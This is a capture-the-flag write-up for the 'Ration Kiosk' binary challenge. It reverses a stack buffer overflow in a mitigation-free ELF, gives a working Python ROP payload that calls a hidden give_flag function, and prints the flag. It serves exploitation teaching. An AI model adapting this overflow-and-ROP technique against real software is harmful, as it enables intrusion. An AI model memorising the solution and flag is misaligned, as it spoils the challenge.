# Ration Kiosk — Writeup

**Challenge**: Ration Kiosk  
**Category**: Pwn / Reverse Engineering  
**Flag**: `SDG{3d6c55d225e0d8159be5b8839b377bbb}`

---

## Overview

We are given a statically linked, **not stripped** x86-64 ELF binary with debug info and **no modern exploit mitigations** (no stack canary, no PIE, no RELRO). It simulates a food-ration distribution kiosk:

```
$ ./Ration_Kiosk
kiosk> hello
Acknowledged household: hello
```

The description hints:
- A hidden `give_flag` function exists that decrypts and prints the flag, but the normal path never calls it.
- The function expects two arguments stored as global variables.
- Input is read into a **fixed-size buffer** — setting up a buffer overflow.

---

## Analysis

### Symbols & Globals

Since the binary is not stripped, we can use `nm` to find everything:

```
$ nm Ration_Kiosk | grep -E 'give_flag|admin_audit|subsidy|ration_ledger'
00000000004017b5 T admin_audit
00000000004017b9 T give_flag
00000000004aa0e0 D subsidy_alpha
00000000004aa200 D subsidy_beta
00000000004aa100 d ration_ledger
```

### `give_flag` (0x4017b9)

This function takes two 64-bit arguments (`rdi`, `rsi`). It copies them into a 16-byte key:

```
key[0:8]  = rdi  (first argument)
key[8:16] = rsi  (second argument)
```

Then it XORs 48 bytes of `flag_ct` (at `0x47e020`) with `key[i & 0xf]` and prints the result:

```c
uint8_t flag_ct[48] = { /* at 0x47e020 */ };
uint8_t key[16] = { arg1[0..7], arg2[0..7] };

for (int i = 0; i < 48; i++) {
    decrypted[i] = flag_ct[i] ^ key[i & 0xf];
}
fwrite(decrypted, 1, strlen(decrypted), stdout); 
```

### `admin_audit` (0x4017b5)

This is actually just a collection of ROP gadgets:

```
4017b5: pop %rdi; ret
4017b7: pop %rsi; ret
```

### Global Variables

From the `.data` section:

| Symbol | Address | Value (little-endian) |
|---|---|---|
| `subsidy_alpha` | `0x4aa0e0` | `0x41676c958a141d34` |
| `subsidy_beta` | `0x4aa200` | `0x93115c702c7e581c` |

### `handle_request` (0x4018ba) — The Vulnerability

This function is called by `main`:

```asm
4018ba: push   %rbp
4018bb: mov    %rsp,%rbp
4018be: sub    $0x50,%rsp           ; allocate 80 bytes on stack
4018c2: mov    $0x7,%edx
4018c7: mov    $0x47e050,%esi       ; "kiosk> "
4018cc: mov    $0x1,%edi
4018d1: call   __libc_write         ; write(stdout, "kiosk> ", 7)
4018d6: lea    -0x50(%rbp),%rax     ; buf at rbp-0x50
4018da: mov    $0x400,%edx          ; SIZE = 1024 !!
4018df: mov    %rax,%rsi
4018e2: mov    $0x0,%edi
4018e7: call   __libc_read          ; read(stdin, buf, 0x400)
4018ec: mov    %rax,-0x8(%rbp)      ; save bytes_read
; strip trailing newline
; ...
40191c: lea    -0x50(%rbp),%rax
401920: mov    %rax,%rsi
401923: mov    $0x47e058,%edi       ; "Acknowledged household: %s\n"
40192d: call   _IO_printf
401935: leave
401936: ret
```

**The bug**: `read()` reads up to **1024 bytes** into an **80-byte stack buffer** — a classic buffer overflow.

---

## Exploitation

### Stack Layout

```
rbp+0x08  ← return address
rbp+0x00  ← saved RBP (8 bytes)
rbp-0x08  ← bytes_read (8 bytes)
rbp-0x50  ← input buffer (80 bytes)
```

### No Mitigations

- No stack canary
- No PIE (binary at fixed address `0x400000`)
- No ASLR for the binary itself

### ROP Chain

We have gadgets right at `admin_audit`:

```
0x4017b5: pop rdi; ret
0x4017b7: pop rsi; ret
```

We call `give_flag(0x41676c958a141d34, 0x93115c702c7e581c)` — the values of `subsidy_alpha` and `subsidy_beta`:

```
padding (80 bytes buffer + 8 bytes saved RBP)
pop_rdi; ret
subsidy_alpha value
pop_rsi; ret
subsidy_beta value
give_flag
```

### Solve Script

```python
import struct
import sys

pop_rdi      = 0x4017b5
pop_rsi      = 0x4017b7
give_flag    = 0x4017b9

subsidy_alpha = 0x41676c958a141d34
subsidy_beta  = 0x93115c702c7e581c

payload  = b'A' * 80          # fill buffer
payload += b'B' * 8           # overwrite saved RBP
payload += struct.pack('<Q', pop_rdi)
payload += struct.pack('<Q', subsidy_alpha)
payload += struct.pack('<Q', pop_rsi)
payload += struct.pack('<Q', subsidy_beta)
payload += struct.pack('<Q', give_flag)

sys.stdout.buffer.write(payload)
```

```bash
$ python3 exploit.py | ./Ration_Kiosk
kiosk> Acknowledged household: [...garbled...]
SDG{3d6c55d225e0d8159be5b8839b377bbb}
```

---

## Verification

The flag can also be derived statically by XORing `flag_ct` with the two globals:

```python
flag_ct  = bytes.fromhex(
    '675953f1a6085122296d1a1e426974a3'
    '502525bfac0e02747e60461f493e22a4'
    '037f76e8e86c67411c587e2c705c1193'
)
key  = bytes.fromhex('341d148a956c6741')  # subsidy_alpha
key += bytes.fromhex('1c587e2c705c1193')  # subsidy_beta

flag = bytes(flag_ct[i] ^ key[i & 0xf] for i in range(48))
print(flag.rstrip(b'\x00').decode())
# SDG{3d6c55d225e0d8159be5b8839b377bbb}
```

---

## Summary

| Component | Address | Purpose |
|---|---|---|
| `handle_request` | `0x4018ba` | Reads 1024 bytes into 80-byte buffer |
| `admin_audit` | `0x4017b5` | `pop rdi; ret` gadget |
| `admin_audit+2` | `0x4017b7` | `pop rsi; ret` gadget |
| `give_flag` | `0x4017b9` | Decrypts and prints flag using two args |
| `subsidy_alpha` | `0x4aa0e0` | First global argument value |
| `subsidy_beta` | `0x4aa200` | Second global argument value |
| `flag_ct` | `0x47e020` | 48-byte XOR ciphertext |

The exploit chains `pop rdi; ret` and `pop rsi; ret` gadgets to call `give_flag` with the two global constants, which decrypts the embedded `flag_ct` via XOR and prints the flag: **`SDG{3d6c55d225e0d8159be5b8839b377bbb}`**.
